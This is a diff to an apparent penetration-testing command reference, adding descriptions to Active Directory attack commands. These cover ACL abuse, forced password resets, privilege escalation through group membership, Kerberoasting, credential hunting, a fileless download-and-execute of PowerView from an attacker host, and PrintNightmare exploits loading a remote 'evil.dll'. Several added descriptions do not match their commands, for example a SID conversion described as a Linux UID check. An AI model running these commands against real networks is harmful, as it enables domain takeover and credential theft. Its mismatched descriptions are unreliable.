+          "command": "net rpc password <target_user> -U <domain>/<user>%<password> -S <dc_ip>",
+          "description": "Resets an Active Directory password remotely from Linux using the Samba net rpc command. Useful when you have the ForceChangePassword extended right and are operating from a Linux attack host."
         },
         {
           "label": "AD module",
-          "command": "Set-ADAccountPassword -Identity <target_user> -Reset -NewPassword (ConvertTo-SecureString '<new>' -AsPlainText -Force)"
+          "command": "Set-ADAccountPassword -Identity <target_user> -Reset -NewPassword (ConvertTo-SecureString '<new>' -AsPlainText -Force)",
+          "description": "Resets an Active Directory account password using the AD PowerShell module. Requires the ForceChangePassword extended right on the target account - used to take over accounts when you have this permission."
         }
       ],
       "steps": [
@@ -108549,11 +109203,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "net (if you have the rights interactively)",
-          "command": "net group \"<group>\" <user> /add /domain"
+          "command": "net group \"<group>\" <user> /add /domain",
+          "description": "Enumerates domain groups and their members using the net command. Quick way to check domain group memberships from a basic command prompt."
         },
         {
           "label": "AD module",
-          "command": "Add-ADGroupMember -Identity '<group>' -Members '<user>'"
+          "command": "Add-ADGroupMember -Identity '<group>' -Members '<user>'",
+          "description": "Adds a user or computer to an Active Directory group using the AD PowerShell module. Use this when you have the required permissions (e.g., GenericAll or WriteProperty on the group) to escalate privileges by joining a more privileged group."
         }
       ],
       "steps": [
@@ -108794,15 +109450,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Filter to interesting rights",
-          "command": "Get-DomainObjectAcl -Identity <object> -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner|GenericWrite'}"
+          "command": "Get-DomainObjectAcl -Identity <object> -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner|GenericWrite'}",
+          "description": "Uses PowerView to enumerate ACLs on AD objects with GUID-to-name resolution. Reveals who has write, reset-password, or other dangerous permissions on target objects - the foundation of ACL-based attack paths."
         },
         {
           "label": "Who has rights over Domain Admins",
-          "command": "Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs -Verbose"
+          "command": "Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs -Verbose",
+          "description": "Uses PowerView to enumerate ACLs on AD objects with GUID-to-name resolution. Reveals who has write, reset-password, or other dangerous permissions on target objects - the foundation of ACL-based attack paths."
         },
         {
           "label": "Set-DomainObjectOwner - WriteOwner abuse (take ownership, then WriteDACL)",
-          "command": "Set-DomainObjectOwner -Identity <target> -OwnerIdentity <attacker> -Credential $Cred"
+          "command": "Set-DomainObjectOwner -Identity <target> -OwnerIdentity <attacker> -Credential $Cred",
+          "description": "Modifies properties on an AD object using PowerView. The specific attack depends on which property is changed and what permissions you hold on the target."
         }
       ],
       "steps": [
@@ -109193,7 +109852,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Try blank password on those accounts",
-          "command": "crackmapexec smb <dc_ip> -u <user> -p ''"
+          "command": "crackmapexec smb <dc_ip> -u <user> -p ''",
+          "description": "Uses CrackMapExec for network authentication testing and remote operations across multiple protocols and targets."
         }
       ],
       "explain": "Finds accounts that allow an empty password with PowerView:\n  Get-DomainUser -UACFilter PASSWD_NOTREQD   users with the PASSWD_NOTREQD UAC flag\n  | Select samaccountname,useraccountcontrol   confirm the flag\nThese accounts may authenticate with a blank password - test them with 'crackmapexec smb <dc> -u <list> -p \"\"'. Often leftovers from migrations or misconfigured service accounts."
@@ -109389,11 +110049,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Targeted AS-REP (set the UAC flag if you have write)",
-          "command": "Set-DomainObject -Identity <target> -XOR @{useraccountcontrol=4194304} -Verbose"
+          "command": "Set-DomainObject -Identity <target> -XOR @{useraccountcontrol=4194304} -Verbose",
+          "description": "Modifies properties on an AD object using PowerView. The specific attack depends on which property is changed and what permissions you hold on the target."
         },
         {
           "label": "Revert the flag after roasting",
-          "command": "Set-DomainObject -Identity <target> -XOR @{useraccountcontrol=4194304} -Verbose"
+          "command": "Set-DomainObject -Identity <target> -XOR @{useraccountcontrol=4194304} -Verbose",
+          "description": "Modifies properties on an AD object using PowerView. The specific attack depends on which property is changed and what permissions you hold on the target."
         }
       ],
       "steps": [
@@ -109601,11 +110263,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Foreign users (our principals in their groups)",
-          "command": "Get-DomainForeignUser -Domain <foreign_domain>"
+          "command": "Get-DomainForeignUser -Domain <foreign_domain>",
+          "description": "Identifies domain users who are members of groups in other (foreign) domains. These cross-domain memberships create attack paths for pivoting between domains via trust relationships."
         },
         {
           "label": "Map all trusts first",
-          "command": "Get-DomainTrustMapping"
+          "command": "Get-DomainTrustMapping",
+          "description": "Uses PowerView to enumerate domain trust relationships. Trust direction and type determine whether you can pivot across domain boundaries and which attacks (SID history, TGT forging) apply."
         }
       ],
       "steps": [
@@ -109844,11 +110508,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Only ACLs involving principals you control",
-          "command": "Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match '<user>|<group>'}"
+          "command": "Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match '<user>|<group>'}",
+          "description": "Scans for exploitable ACLs filtered to principals you control. Finds objects where your current account or groups have dangerous permissions (WriteDACL, GenericAll, ForceChangePassword, etc.) - directly actionable privilege escalation paths."
         },
         {
           "label": "Export for review",
-          "command": "Find-InterestingDomainAcl -ResolveGUIDs | Export-Csv acls.csv -NoTypeInformation"
+          "command": "Find-InterestingDomainAcl -ResolveGUIDs | Export-Csv acls.csv -NoTypeInformation",
+          "description": "Exports all interesting (non-default, exploitable) domain ACLs to a CSV file for offline analysis. Useful for systematic review of the ACL attack surface when the output is too large for console review."
         }
       ],
       "steps": [
@@ -110061,7 +110727,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Then roast",
-          "command": "Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat"
+          "command": "Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat",
+          "description": "Uses PowerView to find domain users with SPNs set - targets for Kerberoasting. PowerView provides richer output formatting and filtering than the native AD module."
         }
       ],
       "explain": "Lists Kerberoastable SPN accounts with PowerView:\n  Get-DomainUser -SPN   users that have a ServicePrincipalName set\n  -Properties samaccountname,ServicePrincipalName   return the SPN\nThese accounts can be Kerberoasted; prioritize ones with admincount=1 or RC4 support - feed them to Rubeus kerberoast or GetUserSPNs.py."
@@ -110247,11 +110914,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "All SPN users at once",
-          "command": "Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv hashes.csv -NoTypeInformation"
+          "command": "Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv hashes.csv -NoTypeInformation",
+          "description": "Uses PowerView to find domain users with SPNs set - targets for Kerberoasting. PowerView provides richer output formatting and filtering than the native AD module."
         },
         {
           "label": "Single user",
-          "command": "Get-DomainUser -Identity <user> | Get-DomainSPNTicket -Format Hashcat | fl"
+          "command": "Get-DomainUser -Identity <user> | Get-DomainSPNTicket -Format Hashcat | fl",
+          "description": "Uses PowerView to find domain users with SPNs set - targets for Kerberoasting. PowerView provides richer output formatting and filtering than the native AD module."
         }
       ],
       "steps": [
@@ -110467,7 +111136,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Domain Admins recursively",
-          "command": "Get-DomainGroupMember -Identity 'Domain Admins' -Recurse | select MemberName"
+          "command": "Get-DomainGroupMember -Identity 'Domain Admins' -Recurse | select MemberName",
+          "description": "Uses PowerView to enumerate administrative and privileged groups in the domain for attack path mapping."
         }
       ],
       "explain": "Expands group membership, including nested groups, with PowerView:\n  Get-DomainGroupMember -Identity \"<group>\"   list the group's members\n  -Recurse                                    follow nested group membership to the real effective members\nReveals who actually holds privileged rights (Domain Admins membership is often nested several levels deep) - the true target list for compromise."
@@ -110662,7 +111332,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "External trusts only",
-          "command": "Get-DomainTrust | ?{$_.TrustAttributes -notmatch 'WITHIN_FOREST'}"
+          "command": "Get-DomainTrust | ?{$_.TrustAttributes -notmatch 'WITHIN_FOREST'}",
+          "description": "Uses PowerView to enumerate domain trust relationships. Trust direction and type determine whether you can pivot across domain boundaries and which attacks (SID history, TGT forging) apply."
         }
       ],
       "explain": "Maps every trust reachable in the environment with PowerView:\n  Get-DomainTrustMapping   recursively walk trusts from the current domain outward\nUnlike Get-ADTrust (current domain only) this reveals the full forest/inter-forest trust graph - filter for Bidirectional trusts to find the widest attack paths between domains."
@@ -110869,11 +111540,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "All users, key props",
-          "command": "Get-DomainUser -Properties samaccountname,description,memberof,admincount | select samaccountname,description"
+          "command": "Get-DomainUser -Properties samaccountname,description,memberof,admincount | select samaccountname,description",
+          "description": "Uses PowerView to find users flagged as admins (AdminCount=1). This attribute is set by SDProp and persists even after privilege removal - reveals current and former members of protected groups."
         },
         {
           "label": "Only privileged (admincount=1)",
-          "command": "Get-DomainUser -AdminCount | select samaccountname"
+          "command": "Get-DomainUser -AdminCount | select samaccountname",
+          "description": "Uses PowerView to find users flagged as admins (AdminCount=1). This attribute is set by SDProp and persists even after privilege removal - reveals current and former members of protected groups."
         }
       ],
       "explain": "Reads detailed user attributes with PowerView:\n  Get-DomainUser   query user objects\n  -Identity <user>   a specific account (omit for all users)\n  -Domain <domain>   target a specific domain\nReturns UAC flags, SPN, logon history, admincount, and password metadata; select the columns you need, or pipe to a description filter to hunt for creds."
@@ -111072,7 +111745,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Load fileless (after AMSI bypass)",
-          "command": "iex (New-Object Net.WebClient).DownloadString('http://<attacker>/PowerView.ps1')"
+          "command": "iex (New-Object Net.WebClient).DownloadString('http://<attacker>/PowerView.ps1')",
+          "description": "Downloads and executes a PowerShell script directly in memory without writing to disk. Common initial access and tool staging technique - bypasses disk-based AV scanning."
         }
       ],
       "explain": "Loads the PowerView enumeration toolkit into the session:\n  Import-Module .\\PowerView.ps1   make the Get-Domain*/Find-*/Invoke-* cmdlets available\nRequired before any PowerView command; run 'powershell -ep bypass' first if the execution policy blocks it, or load it fileless with IEX (New-Object Net.WebClient).DownloadString('http://<ip>/PowerView.ps1') to avoid touching disk."
@@ -111266,7 +111940,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Filter to non-empty descriptions",
-          "command": "Get-DomainUser * | ?{$_.description} | Select samaccountname,description"
+          "command": "Get-DomainUser * | ?{$_.description} | Select samaccountname,description",
+          "description": "Uses PowerView to enumerate domain user accounts with specific property filters for targeted reconnaissance."
         }
       ],
       "explain": "Hunts for passwords admins left in AD description fields:\n  Get-DomainUser *                                   all user objects\n  | Select samaccountname,description                keep name + description\n  | Where {$_.description -ne $null}                 drop the empty ones\nDescriptions are readable by any authenticated user, so temp/service passwords stored there are free creds; add a -match 'pass|pw|temp' filter, and repeat with Get-DomainComputer."
@@ -111484,7 +112159,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Revert the SPN after roasting",
-          "command": "Set-DomainObject -Credential $Cred -Identity <target> -Clear serviceprincipalname"
+          "command": "Set-DomainObject -Credential $Cred -Identity <target> -Clear serviceprincipalname",
+          "description": "Clears the SPN from a target account after Kerberoasting. Cleanup step to remove the fake SPN you added, reducing the forensic footprint of the attack."
         }
       ],
       "steps": [
@@ -111707,19 +112383,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Across a host list",
-          "command": "Get-DomainComputer | %{ Test-AdminAccess -ComputerName $_.dnshostname }"
+          "command": "Get-DomainComputer | %{ Test-AdminAccess -ComputerName $_.dnshostname }",
+          "description": "Uses PowerView to enumerate domain-joined computers and their properties for target identification."
         },
         {
           "label": "Get-NetLocalGroupMember - enumerate local Administrators on a remote host",
-          "command": "Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName Administrators"
+          "command": "Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName Administrators",
+          "description": "Get-NetLocalGroupMember - enumerate local Administrators on a remote host. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Get-NetLocalGroupMember - check Remote Desktop Users",
-          "command": "Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Desktop Users\""
+          "command": "Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Desktop Users\"",
+          "description": "Get-NetLocalGroupMember - check Remote Desktop Users. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Get-NetLocalGroupMember - check Remote Management Users (WinRM access)",
-          "command": "Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Management Users\""
+          "command": "Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Management Users\"",
+          "description": "Get-NetLocalGroupMember - check Remote Management Users (WinRM access). See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -111948,11 +112628,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "ConvertTo-SID (name to SID)",
-          "command": "ConvertTo-SID '<domain>\\<user>'"
+          "command": "ConvertTo-SID '<domain>\\<user>'",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "Convert-SidToName (SID to readable name)",
-          "command": "Convert-SidToName <sid>"
+          "command": "Convert-SidToName <sid>",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Hunts for dangerous, non-default ACLs across the domain with PowerView:\n  Find-InterestingDomainAcl   enumerate ACEs that are not built-in defaults\n  -ResolveGUIDs            translate schema/extended-right GUIDs to readable rights\n  | select IdentityReferenceName,ObjectDN,ActiveDirectoryRights   who has what right over which object\nLook for WriteDACL/GenericAll/GenericWrite/AllExtendedRights held by non-privileged users - each is an ACL abuse path (Shadow Creds, targeted Kerberoast, DCSync grant)."
@@ -112203,15 +112885,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Domain controllers",
-          "command": "Get-DomainController -Domain <domain>"
+          "command": "Get-DomainController -Domain <domain>",
+          "description": "Enumerates all domain controllers using PowerView. Returns hostnames, IPs, OS versions, and roles for each DC - critical for targeting in DCSync, Golden Ticket, and replication attacks."
         },
         {
           "label": "Domain SID",
-          "command": "Get-DomainSID"
+          "command": "Get-DomainSID",
+          "description": "Retrieves the domain SID, the base identifier used to construct all security identifiers in the domain. Required for forging Golden Tickets, Silver Tickets, and SID history attacks."
         },
         {
           "label": "Deprecated PowerView alias (OSCP PEN-200 Ch21)",
-          "command": "Get-NetDomain   # older PowerView name for Get-Domain - identical output"
+          "command": "Get-NetDomain   # older PowerView name for Get-Domain - identical output",
+          "description": "Deprecated PowerView alias (OSCP PEN-200 Ch21). See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Enumerates the domain, forest, and DCs from an authenticated Windows session with PowerView:\n  Get-Domain               core domain object (add -Domain <domain> to target a trusted domain)\nFollow-ons: Get-DomainController for DCs, Get-Forest for the forest, Get-DomainSID for the SID you need to forge tickets. (Get-NetDomain is the deprecated alias.)"
@@ -112251,23 +112936,28 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Search a specific path for interesting files",
-          "command": "Find-InterestingFile -Path \\\\<host>\\<share>\\ -Include *.txt,*.xml,*.config,*.kdbx"
+          "command": "Find-InterestingFile -Path \\\\<host>\\<share>\\ -Include *.txt,*.xml,*.config,*.kdbx",
+          "description": "Uses PowerView to crawl accessible network shares looking for sensitive files (configs, scripts, passwords, private keys). Searches file names and extensions for common patterns that indicate credential exposure."
         },
         {
           "label": "ACLs on a filesystem path (SYSVOL / share perms)",
-          "command": "Get-PathAcl -Path \\\\<dc>\\sysvol"
+          "command": "Get-PathAcl -Path \\\\<dc>\\sysvol",
+          "description": "ACLs on a filesystem path (SYSVOL / share perms). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Find reachable domain shares first",
-          "command": "Find-DomainShare -CheckShareAccess"
+          "command": "Find-DomainShare -CheckShareAccess",
+          "description": "Discovers network shares across domain computers. Identifies accessible file shares for data mining, credential harvesting, and finding writable deployment shares."
         },
         {
           "label": "Interesting files, last-accessed filter",
-          "command": "Find-InterestingDomainShareFile -Include *cred*,*.ps1 -LastAccessTime (Get-Date).AddDays(-30)"
+          "command": "Find-InterestingDomainShareFile -Include *cred*,*.ps1 -LastAccessTime (Get-Date).AddDays(-30)",
+          "description": "Uses PowerView to crawl accessible network shares looking for sensitive files (configs, scripts, passwords, private keys). Searches file names and extensions for common patterns that indicate credential exposure."
         },
         {
           "label": "PowerView recursive file finder",
-          "command": "Invoke-FileFinder -Verbose   # PowerView: find files by name/pattern across reachable shares"
+          "command": "Invoke-FileFinder -Verbose   # PowerView: find files by name/pattern across reachable shares",
+          "description": "PowerView recursive file finder. See the command syntax for exact parameters and flags."
         }
       ],
       "examples": [
@@ -112521,27 +113211,33 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "All subnets (mapped to sites)",
-          "command": "Get-DomainSubnet | select name,site"
+          "command": "Get-DomainSubnet | select name,site",
+          "description": "All subnets (mapped to sites). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Site of a specific host",
-          "command": "Get-NetComputerSiteName -ComputerName <host>"
+          "command": "Get-NetComputerSiteName -ComputerName <host>",
+          "description": "Identifies which Active Directory site a computer belongs to. AD sites typically map to physical locations or network segments - useful for understanding network topology and scoping attacks."
         },
         {
           "label": "Global Catalog servers in the forest",
-          "command": "Get-ForestGlobalCatalog"
+          "command": "Get-ForestGlobalCatalog",
+          "description": "Global Catalog servers in the forest. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Domain controllers",
-          "command": "Get-DomainController | select Name,IPAddress,OSVersion"
+          "command": "Get-DomainController | select Name,IPAddress,OSVersion",
+          "description": "Domain controllers - outputs Name, IPAddress, OSVersion."
         },
         {
           "label": "Forest + child domains",
-          "command": "Get-ForestDomain"
+          "command": "Get-ForestDomain",
+          "description": "Lists all domains in the current AD forest using PowerView. Maps the complete forest structure for cross-domain attack planning."
         },
         {
           "label": "Resolve-IPAddress (hostname to IP)",
-          "command": "Resolve-IPAddress -ComputerName <host>"
+          "command": "Resolve-IPAddress -ComputerName <host>",
+          "description": "Lists active network connections and listening ports. Identifies internal services, database connections, and potential pivoting targets not visible from external scans."
         }
       ],
       "examples": [
@@ -112957,19 +113653,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Forest object",
-          "command": "Get-Forest -Forest <forest>"
+          "command": "Get-Forest -Forest <forest>",
+          "description": "Retrieves forest-level metadata including the root domain, forest functional level, and trust information using PowerView. Overview of the forest architecture."
         },
         {
           "label": "Forest global catalogs",
-          "command": "Get-ForestGlobalCatalog -Forest <forest>"
+          "command": "Get-ForestGlobalCatalog -Forest <forest>",
+          "description": "Lists Global Catalog servers in the forest using PowerView. GC servers hold a partial replica of all domains and can be queried for cross-domain user/group information."
         },
         {
           "label": "Forest trusts (external/forest)",
-          "command": "Get-ForestTrust -Forest <forest>"
+          "command": "Get-ForestTrust -Forest <forest>",
+          "description": "Forest trusts (external/forest). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Get-DomainTrustMapping (recursive full trust map)",
-          "command": "Get-DomainTrustMapping"
+          "command": "Get-DomainTrustMapping",
+          "description": "Uses PowerView to enumerate domain trust relationships. Trust direction and type determine whether you can pivot across domain boundaries and which attacks (SID history, TGT forging) apply."
         }
       ],
       "explain": "Enumerates trust relationships to find lateral paths across domain/forest boundaries:\n  Get-DomainTrust          list this domain's trusts\n  | select SourceName,TargetName,TrustDirection,TrustType   the endpoints, direction, and kind of each trust\nAdd Get-ForestTrust for forest trusts and Get-DomainTrustMapping to recursively map the whole trust graph - the direction and type tell you which trusts can be abused (e.g. SID History via a parent-child trust)."
@@ -113191,55 +113891,68 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Get-NetLoggedon (logged-on users on a host)",
-          "command": "Get-NetLoggedon -ComputerName <host>"
+          "command": "Get-NetLoggedon -ComputerName <host>",
+          "description": "Enumerates users currently logged into a remote machine via the NetWkstaUserEnum API. Shows interactive and service logon sessions - useful for finding where admins are logged in for credential theft."
         },
         {
           "label": "Get-NetSession (active sessions on a host)",
-          "command": "Get-NetSession -ComputerName <host>"
+          "command": "Get-NetSession -ComputerName <host>",
+          "description": "Enumerates active SMB sessions on a remote server via the NetSessionEnum API. Shows which users have network connections to the machine - reveals active file sharing and administrative sessions."
         },
         {
           "label": "Get-NetRDPSession (RDP sessions on a host)",
-          "command": "Get-NetRDPSession -ComputerName <host>"
+          "command": "Get-NetRDPSession -ComputerName <host>",
+          "description": "Enumerates active RDP sessions on a remote machine. Shows which users have remote desktop connections, including disconnected sessions that may still have cached credentials."
         },
         {
           "label": "Get-RegLoggedOn (logged-on via remote registry)",
-          "command": "Get-RegLoggedOn -ComputerName <host>"
+          "command": "Get-RegLoggedOn -ComputerName <host>",
+          "description": "Enumerates logged-on users via the remote registry by reading HKU subkeys. Each loaded registry hive corresponds to a logged-in user - an alternative enumeration method when session APIs are restricted."
         },
         {
           "label": "Find-DomainProcess (hunt a process domain-wide)",
-          "command": "Find-DomainProcess -ProcessName <proc>"
+          "command": "Find-DomainProcess -ProcessName <proc>",
+          "description": "Enumerates running processes on remote machines to find sessions of target users. An alternative to session enumeration - identifies machines where specific users have active processes."
         },
         {
           "label": "Find-DomainUserEvent (logon events for a user)",
-          "command": "Find-DomainUserEvent -UserIdentity <user>"
+          "command": "Find-DomainUserEvent -UserIdentity <user>",
+          "description": "Find-DomainUserEvent (logon events for a user). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Get-DomainUserEvent (4624 logon events on a host)",
-          "command": "Get-DomainUserEvent -ComputerName <host>"
+          "command": "Get-DomainUserEvent -ComputerName <host>",
+          "description": "Uses PowerView to enumerate domain user accounts with specific property filters for targeted reconnaissance."
         },
         {
           "label": "Find-DomainLocalGroupMember (local group members domain-wide)",
-          "command": "Find-DomainLocalGroupMember -GroupName Administrators"
+          "command": "Find-DomainLocalGroupMember -GroupName Administrators",
+          "description": "Find-DomainLocalGroupMember (local group members domain-wide). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Who is logged on locally (needs local admin)",
-          "command": "Get-LoggedonLocal -ComputerName <host>"
+          "command": "Get-LoggedonLocal -ComputerName <host>",
+          "description": "Enumerates locally logged-on users by reading the remote event log for logon events. Works when other session enumeration methods (NetSession, WMI) are blocked or restricted."
         },
         {
           "label": "Last user logged on to a host",
-          "command": "Get-LastLoggedOn -ComputerName <host>"
+          "command": "Get-LastLoggedOn -ComputerName <host>",
+          "description": "Last user logged on to a host. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Find-LocalAdminAccess (machines where current user is admin)",
-          "command": "Find-LocalAdminAccess"
+          "command": "Find-LocalAdminAccess",
+          "description": "Uses PowerView to find machines where the current user has local administrator access. Iterates through domain computers testing admin access - identifies lateral movement targets without needing credentials."
         },
         {
           "label": "Test-AdminAccess (test admin on a specific host)",
-          "command": "Test-AdminAccess -ComputerName <host>"
+          "command": "Test-AdminAccess -ComputerName <host>",
+          "description": "Lists active network connections and listening ports. Identifies internal services, database connections, and potential pivoting targets not visible from external scans."
         },
         {
           "label": "Get-NetLocalGroup (local groups on a machine)",
-          "command": "Get-NetLocalGroup -ComputerName <host>"
+          "command": "Get-NetLocalGroup -ComputerName <host>",
+          "description": "Get-NetLocalGroup (local groups on a machine). See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Locates where privileged users are currently logged on, to plan a lateral hop that steals their session:\n  Find-DomainUserLocation   query hosts for sessions of high-value users\n  -CheckAccess             also test whether YOU are local admin on each host found\nWhere a DA is logged in AND you have admin, that box is a credential-theft target. Backing cmdlets (Get-NetSession, Get-NetLoggedon, Find-LocalAdminAccess) enumerate sessions and admin access per host."
@@ -113520,47 +114233,58 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Get-DomainComputer full properties",
-          "command": "Get-DomainComputer -Properties * | select dnshostname,operatingsystem,lastlogontimestamp"
+          "command": "Get-DomainComputer -Properties * | select dnshostname,operatingsystem,lastlogontimestamp",
+          "description": "Uses PowerView to enumerate all domain computers with their OS version. Identifies potential targets - older systems may lack patches, and servers often hold higher-value data."
         },
         {
           "label": "Get-NetComputerSiteName (AD site for a machine)",
-          "command": "Get-NetComputerSiteName -ComputerName <host>"
+          "command": "Get-NetComputerSiteName -ComputerName <host>",
+          "description": "Identifies which Active Directory site a computer belongs to. AD sites typically map to physical locations or network segments - useful for understanding network topology and scoping attacks."
         },
         {
           "label": "Get-DomainManagedSecurityGroup (managed-by set)",
-          "command": "Get-DomainManagedSecurityGroup"
+          "command": "Get-DomainManagedSecurityGroup",
+          "description": "Finds security groups with a manager designated via the managedBy attribute who also has write access. The manager can add members to the group, creating an indirect privilege escalation path."
         },
         {
           "label": "Get-DomainForeignUser (users in foreign-domain groups)",
-          "command": "Get-DomainForeignUser"
+          "command": "Get-DomainForeignUser",
+          "description": "Identifies domain users who are members of groups in other (foreign) domains. These cross-domain memberships create attack paths for pivoting between domains via trust relationships."
         },
         {
           "label": "Get-DomainForeignGroupMember (foreign members in our groups)",
-          "command": "Get-DomainForeignGroupMember -Domain <domain>"
+          "command": "Get-DomainForeignGroupMember -Domain <domain>",
+          "description": "Finds groups that contain members from foreign domains. Reveals cross-domain trust abuse paths where compromising a user in one domain grants access in another."
         },
         {
           "label": "New-DomainUser (create user - needs delegated rights)",
-          "command": "New-DomainUser -SamAccountName <user> -AccountPassword (ConvertTo-SecureString '<pass>' -AsPlainText -Force)"
+          "command": "New-DomainUser -SamAccountName <user> -AccountPassword (ConvertTo-SecureString '<pass>' -AsPlainText -Force)",
+          "description": "New-DomainUser (create user - needs delegated rights). See the command syntax for exact parameters and flags."
         },
         {
           "label": "New-DomainGroup (create group - needs delegated rights)",
-          "command": "New-DomainGroup -SamAccountName <group>"
+          "command": "New-DomainGroup -SamAccountName <group>",
+          "description": "New-DomainGroup (create group - needs delegated rights). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Set-DomainUserPassword (reset - needs Reset-Password right)",
-          "command": "Set-DomainUserPassword -Identity <user> -AccountPassword (ConvertTo-SecureString '<pass>' -AsPlainText -Force)"
+          "command": "Set-DomainUserPassword -Identity <user> -AccountPassword (ConvertTo-SecureString '<pass>' -AsPlainText -Force)",
+          "description": "Set-DomainUserPassword (reset - needs Reset-Password right). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Convert-ADName (convert name formats: DN, NT4, canonical)",
-          "command": "Convert-ADName -Identity '<domain>\\<user>' -OutputType Canonical"
+          "command": "Convert-ADName -Identity '<domain>\\<user>' -OutputType Canonical",
+          "description": "Convert-ADName (convert name formats: DN, NT4, canonical). See the command syntax for exact parameters and flags."
         },
         {
           "label": "ConvertFrom-UACValue (decode userAccountControl flags)",
-          "command": "ConvertFrom-UACValue -Value <uac_int>"
+          "command": "ConvertFrom-UACValue -Value <uac_int>",
+          "description": "ConvertFrom-UACValue (decode userAccountControl flags). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Export-PowerViewCSV (thread-safe CSV output)",
-          "command": "Get-DomainUser | Export-PowerViewCSV -CSV <outfile>.csv"
+          "command": "Get-DomainUser | Export-PowerViewCSV -CSV <outfile>.csv",
+          "description": "Uses PowerView to enumerate domain user accounts with specific property filters for targeted reconnaissance."
         }
       ],
       "explain": "Enumerates users, groups, and the accounts worth attacking with PowerView:\n  Get-DomainUser -Properties samaccountname,description,memberof,admincount   pull key attributes\n  | select samaccountname,description,admincount   admincount=1 marks protected (privileged) accounts; descriptions often leak passwords\nSwap flags to hunt targets: -SPN (Kerberoastable), -PreauthNotRequired (AS-REP roastable), Get-DomainGroupMember 'Domain Admins' -Recurse."
@@ -114368,15 +115092,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Local (CVE-2021-1675) - add admin",
-          "command": "Invoke-Nightmare -NewUser \"<user>\" -NewPassword \"<password>\""
+          "command": "Invoke-Nightmare -NewUser \"<user>\" -NewPassword \"<password>\"",
+          "description": "Local (CVE-2021-1675) - add admin. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Remote (Impacket) DLL drop",
-          "command": "python3 CVE-2021-1675.py <domain>/<user>:<password>@<target> '\\\\<attacker>\\share\\evil.dll'"
+          "command": "python3 CVE-2021-1675.py <domain>/<user>:<password>@<target> '\\\\<attacker>\\share\\evil.dll'",
+          "description": "Remote (Impacket) DLL drop. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Mimikatz misc::printnightmare",
-          "command": "misc::printnightmare /server:<target> /library:\\\\<attacker>\\share\\evil.dll"
+          "command": "misc::printnightmare /server:<target> /library:\\\\<attacker>\\share\\evil.dll",
+          "description": "Mimikatz misc::printnightmare. See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -114600,7 +115327,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Local (add admin)",
-          "command": "Invoke-Nightmare -NewUser <user> -NewPassword <password>"
+          "command": "Invoke-Nightmare -NewUser <user> -NewPassword <password>",
+          "description": "Exploits the PrintNightmare vulnerability (CVE-2021-1675/34527) to add a new local administrator account. Abuses the Windows Print Spooler service for local privilege escalation."
         }
       ],
